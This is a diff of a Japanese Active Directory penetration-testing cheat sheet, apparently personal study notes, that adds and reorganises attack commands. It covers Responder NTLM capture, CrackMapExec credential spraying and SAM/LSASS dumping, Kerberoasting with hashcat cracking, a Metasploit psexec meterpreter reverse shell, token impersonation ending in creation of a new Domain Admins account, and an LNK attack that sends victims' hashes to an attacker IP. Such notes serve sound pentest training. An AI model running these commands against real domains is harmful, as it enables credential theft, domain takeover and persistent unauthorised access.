@@ -148,7 +148,7 @@ Invoke-DomainPasswordSpray -Password '<PASSWORD_TO_SPRAY>' -OutFile spray_succes
 ### Responder
 ネットワーク内でLLMNRやNBT-NSリクエストを偽装応答し、NTLMハッシュを奪取
 ```shell
-sudo responder -I <NIC>
+sudo responder -I <NIC> -dPv
 ```
 ### ntlm_theft
 SMBに書き込みができる時に使用例あり
@@ -296,7 +296,7 @@ python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> --da
 python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> -PU
 ```
 
-### BloodHound.py / SharpHound
+### BloodHound / SharpHound
 Active Directoryのオブジェクト間の関係性を収集・分析し、攻撃経路を視覚化
 - Linuxコレクター:
 ```shell
@@ -397,7 +397,7 @@ adidnsdump -u <DOMAIN_NAME>\\<USER> ldap//<DC_IP> -r
 ```
 
 ---
-# Literal Movement
+# Lateral Movement
 他の資格情報を取得するための列挙・攻撃
 ## 証明書関連の脆弱性
 ### Certpy
@@ -477,11 +477,30 @@ SQL> xp_cmdshell whoami
 ```
 
 ## Pass-the-Hash (PtH) / Pass-the-Ticket (PtT)
+
+### CrackMapExec (PtP)
+ユーザーの認証情報が他のマシンでも使用されていないかの確認
+- 認証情報とネットワーク範囲・ドメインを指定することで、一括ですでに手に入れた認証情報でログインできるマシンを洗いだせる
+```sh
+crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -p <pass>
+```
 ### CrackMapExec (PtH)
 ユーザーのNTLMハッシュを使用してSMB経由で認証し、コマンド実行など
 ```shell
-crackmapexec smb <TARGET_IP> -u <USER> -H <NTHASH>
+crackmapexec smb <TARGET_IP/ネットワーク範囲> -u <USER> -H <NTHASH>
 ```
+
+管理者権限のアカウントが見つかったら、CrackMapExecで以下のコマンドも試せる
+- `--local-auth --sam` : SAMに含まれているハッシュをダンプ
+- `--local-auth -M lsassy` : mimikatzの主な攻撃対象のLSASSに含まれている資格情報をダンプ
+- `--local-auth --shares` : SMB共有の列挙
+- `-M keepass_discover` : Keepassファイルの探索
+- `-M gpp_password` :  GPPパスワードの探索
+- `-M wdigest` : WDigest認証の設定を確認し、メモリに平文パスワードが残っているかを探る
+- `-M wireless` : インターネットの認証情報とSSID
+
+他のモジュールも探したかったら
+- `crackmapexec smb -L` : crackmapexecのモジュール一覧検索
 ### Mimikatz (Windows - PtH)
 NTLMハッシュをメモリに注入し、そのユーザーになりすましてプロセスを実行
 ```powershell
@@ -499,8 +518,56 @@ Base64エンコードされたチケットや.kirbiファイルをメモリに�
 .\Rubeus.exe ptt /ticket:<BASE64_TICKET_OR_KIRBI_FILE>
 ```
 
-## Kerberos ダブルホップ問題の回避
-### Invoke-Command (PowerShell)
+## Kerberoasting
+### SPNアカウント列挙
+サービスプリンシパル名(SPN)が設定されたユーザーアカウント（Kerberoastingの対象）の列挙
+- GetUserSPNs.py (Linux)
+```shell
+GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
+```
+- PowerView (Windows)
+```powershell
+Get-DomainUser -SPN
+```
+- setspn.exe (Windows)
+```shell
+setspn.exe -Q */*
+```
+### TGSチケット要求
+列挙したSPNアカウントのTGS（サービスチケット）を要求し、そのハッシュを取得
+- 一回も使われたことがないアカウントは、ダミーアカウントかもしれないから注意
+
+- GetUserSPNs.py
+```shell
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request -outputfile tgs_tickets
+```
+- Rubeus (Windows)
+```powershell
+.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap /format:hashcat
+```
+    *(RC4強制は `/tgtdeleg` オプション)*
+- PowerShell (Windows, 手動)
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+```
+- (Mimikatzでメモリからエクスポート)
+```powershell
+kerberos::list /export
+```
+### ハッシュクラック
+取得したTGSハッシュ（モード13100）をオフラインでクラック
+- Hashcat
+```shell
+hashcat -m 13100 tgs_tickets /path/to/wordlist.txt
+```
+- John
+```shell
+john --wordlist=/path/to/wordlist.txt tgs_tickets
+```
+
+### Kerberos ダブルホップ問題の回避
+#### Invoke-Command (PowerShell)
 PSCredentialオブジェクトを使用して明示的に認証情報を渡し、2ホップ先のリソースにアクセス
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
@@ -508,6 +575,70 @@ $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', 
 Invoke-Command -ComputerName <HOP1_TARGET> -ScriptBlock { Invoke-Command -ComputerName <HOP2_TARGET> -ScriptBlock { whoami } -Credential $using:Cred } -Credential $Cred
 ```
 
+## トークンなりすまし攻撃
+
+
+仕組み
+- ユーザーがログオンすると、**アクセストークン**が発行される
+- 他のプロセスやサービスがそのユーザーのトークンを「開いたまま持っている」と、それを**借りて（impersonate）なりすまし**ができる
+### Metasploit
+まずは、metapreterシェルを設定する ( msfconsole内
+```sh
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+# RHOSTは、AD参加ホストであればなんでも。DC以外でも良い。
+set RHOSTS <AD参加ホストIP>
+set smbuser <ユーザーネーム>
+set smbpass <パスワード>
+set smbdomain <ドメイン名>
+set LHOST 
+```
+
+以下 meterpreter内で実行
+上で、シェルが確立できた後 、なりすましをするためのモジュールをロードする
+```sh
+meterpreter > load incognito
+```
+
+ユーザー（user）に絞って表示、なりすまし可能なトークンを列挙する
+- ここまでで、どのアカウントになり済ますべきか、知っているべき
+```sh
+meterpreter > list_tokens -u
+```
+
+なりすますユーザーを指定し、なりすます
+ - この時、スラッシュを二つつける
+	 - 例 : MARVEL\\fcastle
+```sh
+meterpreter > impersonate_token <なりすますユーザー名>
+meterpreter > shell
+whoami
+```
+
+高い権限でなりすましができた後に、その権限でユーザーを新しく作成する
+そして、作成したアカウントで、もう一度`secretsdump.py`などでハッシュをダンプすると、全てのハッシュを取得できる
+```windows shell
+net user /add <ユーザーネーム> <パスワード> /domain
+net group "Domain Admins" <ユーザーネーム> /ADD /DOMAIN
+```
+
+
+## LNK File Attack
+攻撃の流れ
+1.  悪意ある .lnk（ショートカット）ファイルを作る
+2.  その .lnk ファイルを共有フォルダに置く
+3. ターゲットがアクセス・表示するのを待つ
+4. Responderでハッシュを取得
+
+.inkファイルを公開共有フィルだに設置する
+```sh
+netexec smb <AD参加ホスト> -d <ドメイン名> -u <ユーザー名> -p <パスワード> -M slinky -M slinky -o NAME=test SERVER=<攻撃者IP>
+```
+
+Responderを実行し、ハッシュが飛んでくるのを待つ
+```sh
+sudo responder -I eth0 -dPv
+```
 ## ドメイン信頼関係の悪用
 ### SID History / ExtraSIDs (子→親)
 子ドメインのKRBTGTハッシュと親ドメインの特権グループSIDを使用してGolden Ticketを作成し、親ドメインを掌握
@@ -553,52 +684,6 @@ Get-DomainForeignGroupMember -Domain <TARGET_DOMAIN>
 ---
 # Privilege Escatlation
 (権限昇格のための列挙・攻撃)
-
-## Kerberoasting
-### SPNアカウント列挙
-サービスプリンシパル名(SPN)が設定されたユーザーアカウント（Kerberoastingの対象）の列挙
-- GetUserSPNs.py (Linux)
-```shell
-GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
-```
-- PowerView (Windows)
-```powershell
-Get-DomainUser -SPN
-```
-- setspn.exe (Windows)
-```shell
-setspn.exe -Q */*
-```
-### TGSチケット要求
-列挙したSPNアカウントのTGS（サービスチケット）を要求し、そのハッシュを取得
-- GetUserSPNs.py
-```shell
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request -outputfile tgs_tickets
-```
-- Rubeus (Windows)
-```powershell
-.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap /format:hashcat
-```
-    *(RC4強制は `/tgtdeleg` オプション)*
-- PowerShell (Windows, 手動)
-```powershell
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
-```
-- (Mimikatzでメモリからエクスポート)
-```powershell
-kerberos::list /export
-```
-### ハッシュクラック
-取得したTGSハッシュ（モード13100）をオフラインでクラック
-- Hashcat
-```shell
-hashcat -m 13100 tgs_tickets /path/to/wordlist.txt
-```
-- John
-```shell
-john --wordlist=/path/to/wordlist.txt tgs_tickets
-```
 
 ## ACL (アクセス制御リスト) の悪用
 
@@ -735,7 +820,7 @@ KerberosチケットのPAC（特権属性証明書）を偽造し、ドメイン
 Get-DomainUser -UACFilter PASSWD_NOTREQD
 ```
 - (空パスワード等でログイン試行)
-### GPP (グループポリシー設定) パスワード
+### グループポリシー設定（GPP）によるパスワードの漏洩
 グループポリシー設定に保存された暗号化パスワード（復号可能）の悪用
 - CrackMapExec
 ```shell
